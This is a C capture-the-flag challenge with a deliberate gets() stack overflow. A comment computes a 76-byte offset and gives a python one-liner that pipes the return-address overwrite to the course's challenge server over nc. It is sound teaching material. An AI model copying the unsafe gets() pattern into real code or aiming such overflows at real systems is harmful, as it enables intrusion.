#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include "../general.h"

void win() {
  printf("Congratulations, you win!!! You successfully changed the code flow\n");
  printf("Flag, %s\n", getflag());
}

int challenge() {
  char buffer[64];
  printf("You win this game if you are able to call the function win.'\n");
  gets(buffer);
}
 
int main() {
  init();
  challenge(); 
}


/* 

After drawing the stack is clear that we only need to overwirte the return adress of the challenge function.

For that we need to know the distance between the memory adress of the buffer and the memory adress of the return adress

Using the gdb we find out that buffer is at 0xbfffef00 and the %ebp register of challenge is at  0xbfffef48.

So basically we need to write in buffer (0xbfffef48 - 0xbfffef00) + 0x04 = 48 + 4 = 76 bytes ( the 0x04 is because of the %ebp of challenge function )

So just write 76 bytes and the adress of the win function which is 
0x8048607  and is written in little endian as  \x07\x86\x04\x08

python -c "print 'A'*76 + '\x07\x86\x04\x08'" | nc mustard.stt.rnl.tecnico.ulisboa.pt 9993

*/












